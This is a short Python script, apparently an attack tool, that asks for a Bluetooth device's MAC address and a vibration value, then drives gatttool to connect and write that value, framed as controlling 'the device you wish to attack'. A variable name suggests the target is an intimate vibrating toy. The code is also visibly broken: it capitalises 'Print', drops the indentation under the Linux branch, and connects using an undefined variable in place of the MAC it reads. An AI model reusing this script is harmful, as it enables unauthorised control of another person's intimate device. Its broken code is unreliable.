#!/usr/bin/python3
import os
import subprocess
import platform
import pexpect
import time
import sys

os = platform.system()

if os == "Windows":
	print("Windows is detected")

elif os == "Linux":
	print("Linux is detected")

elif os == "Darwin":
	Print("MacOS detected")
else:
	Print("Unsure what os is running")


print("Ensure you have the mac address of the device you wish to attack")

print("Enter the mac address")
mac = input("")

print("Enter the vibration")
vibration = input("")

if os == "Linux":
print("gatttool is starting up")
child = pexpect.spawn("gatttool -I")
child.sendline("connect {0}".format(dildo))
child.expect("Connection successful"),
command="char-write-req {0}".format(vibration)
time.sleep(5)
child.sendline(command)
child.expect("Characteristic value was written successfully", timeout=10)
